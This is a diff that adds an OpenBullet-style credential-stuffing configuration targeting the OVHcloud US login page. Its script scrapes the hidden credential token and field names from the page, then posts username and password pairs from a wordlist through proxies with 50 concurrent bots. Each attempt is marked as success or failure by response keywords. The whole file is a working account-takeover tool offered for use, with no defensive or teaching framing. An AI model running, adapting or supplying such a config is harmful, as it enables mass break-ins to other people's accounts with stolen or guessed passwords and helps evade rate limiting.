@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "OVH",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-03T18:47:53.3665124+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#First_Login REQUEST GET "https://us.ovhcloud.com/auth/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#TOKEN PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"credentialToken\" value=\"" "\">" -> VAR "TOKEN" 
+#USER1 PARSE "<SOURCE>" LR "<input type=\"text\" id=\"" "\" placeholder=\"Account ID or email address" -> VAR "USER1" 
+#PASS1 PARSE "<SOURCE>" LR "\"><input type=\"password\" id=\"" "\"" -> VAR "PASS1" 
+#FINAL_LOGIN REQUEST POST "https://us.ovhcloud.com/auth/" 
+  CONTENT "credentialToken=<TOKEN>&sT=&<USER1>=<USER>&<PASS1>=<PASS>&jsE=ok&duration=604800" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+#good/bad KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Account ID or password" 
+  KEYCHAIN Success OR 
+    KEY "Not Acceptable" 
